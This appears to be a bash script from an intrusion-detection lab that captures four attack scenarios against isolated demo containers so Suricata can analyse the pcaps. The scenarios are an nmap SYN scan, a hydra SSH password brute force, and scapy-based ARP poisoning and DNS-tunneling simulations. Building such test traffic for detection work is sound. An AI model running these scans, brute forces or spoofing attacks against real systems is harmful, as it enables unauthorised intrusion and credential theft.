#!/usr/bin/env bash
#
# run_attacks.sh — drive the four lab attack scenarios against the SentriX demo
# targets, capturing each to a pcap that Suricata then processes.
#
# LAB USE ONLY. This runs INSIDE the dedicated `attacker` container on the
# isolated sentrix_lab network (172.30.0.0/24). Every target is a demo
# container defined in docker-compose.yml. Do not run it anywhere else.
#
# Usage (from the repo root):
#   docker compose --profile attack run --rm attacker /scripts/run_attacks.sh [all|1|2|3|4]
#
set -euo pipefail

SSH_TARGET="172.30.0.20"     # target-ssh
WEB_TARGET="172.30.0.21"     # target-web
REDIS_TARGET="172.30.0.22"   # target-redis
PCAP_DIR="/pcaps"
IFACE="${IFACE:-eth0}"
SCENARIO="${1:-all}"

banner() { printf '\n\033[1;36m══ %s ══\033[0m\n' "$1"; }
step()   { printf '  \033[0;36m->\033[0m %s\n' "$1"; }

# capture <pcap-name> <seconds> <command...>
# Runs tcpdump in the background, executes the attack, then stops the capture.
capture() {
  local name="$1"; shift
  local max="$1"; shift
  local pcap="$PCAP_DIR/attack_${name}.pcap"
  step "capturing to ${pcap}"
  tcpdump -i "$IFACE" -w "$pcap" -U "not port 5432" >/dev/null 2>&1 &
  local tpid=$!
  sleep 1
  ( "$@" ) || true
  sleep 1
  kill "$tpid" 2>/dev/null || true
  wait "$tpid" 2>/dev/null || true
  step "saved $(wc -c < "$pcap" 2>/dev/null || echo 0) bytes"
}

scenario_1_recon() {
  banner "Scenario 1 — Reconnaissance: nmap SYN scan"
  step "nmap -sS against ${SSH_TARGET}, ${WEB_TARGET}, ${REDIS_TARGET} (top 100 ports)"
  capture "1_recon" 60 \
    nmap -sS -T4 --top-ports 100 -Pn "$SSH_TARGET" "$WEB_TARGET" "$REDIS_TARGET"
}

scenario_2_bruteforce() {
  banner "Scenario 2 — Credential Access: hydra SSH brute force"
  step "hydra against ssh://${SSH_TARGET} as 'labuser' with the demo wordlist"
  capture "2_bruteforce" 60 \
    hydra -l labuser -P /attacker/wordlist.txt -t 4 -W 1 -f "ssh://${SSH_TARGET}"
}

scenario_3_arp() {
  banner "Scenario 3 — ARP cache poisoning (MITM setup)"
  step "scapy: poison ${WEB_TARGET} to redirect the gateway, then restore"
  capture "3_arp" 30 python3 /attacker/scapy_arp_poison.py
}

scenario_4_dns() {
  banner "Scenario 4 — Exfiltration: DNS tunneling simulation"
  step "scapy: burst of long encoded DNS queries (spoofed source)"
  capture "4_dns_tunnel" 30 python3 /attacker/scapy_dns_tunnel.py
}

banner "SentriX lab attacks — target set: ${SSH_TARGET}, ${WEB_TARGET}, ${REDIS_TARGET}"
case "$SCENARIO" in
  1) scenario_1_recon ;;
  2) scenario_2_bruteforce ;;
  3) scenario_3_arp ;;
  4) scenario_4_dns ;;
  all)
    scenario_1_recon
    scenario_2_bruteforce
    scenario_3_arp
    scenario_4_dns
    ;;
  *) echo "unknown scenario '$SCENARIO' (use: all|1|2|3|4)"; exit 1 ;;
esac

banner "Done — pcaps written to ${PCAP_DIR}"
step "Process them with:  docker compose restart suricata"
